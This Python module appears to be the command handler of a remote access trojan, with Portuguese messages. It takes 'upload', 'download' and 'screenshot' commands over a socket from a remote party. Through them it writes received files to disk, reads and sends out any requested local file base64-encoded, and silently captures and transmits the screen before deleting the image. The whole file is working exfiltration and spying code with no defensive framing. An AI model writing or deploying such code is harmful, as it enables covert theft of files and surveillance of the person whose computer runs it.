import base64
import pyautogui
import os

def send_file(client, filepath):
    if not os.path.exists(filepath):
        client.send(f"ERRO: Arquivo {filepath} nao encontrado".encode())
        return
    with open(filepath, "rb") as f:
        data = f.read()
    encoded = base64.b64encode(data).decode()
    client.send(encoded.encode())

def receive_file(client, filename):
    client.send("READY".encode())
    data = client.recv(10*1024*1024)
    try:
        with open(filename, "wb") as f:
            f.write(base64.b64decode(data))
        client.send(f"Upload {filename} concluido".encode())
    except Exception as e:
        client.send(f"ERRO: {e}".encode())

def process_command(client, command):
    if command.startswith("upload "):
        filename = command[7:].strip()
        receive_file(client, filename)
        return True

    if command.startswith("download "):
        filename = command[9:].strip()
        send_file(client, filename)
        return True

    if command == "screenshot":
        img = pyautogui.screenshot()
        img.save("screenshot.png")
        send_file(client, "screenshot.png")
        os.remove("screenshot.png")
        return True

    return False
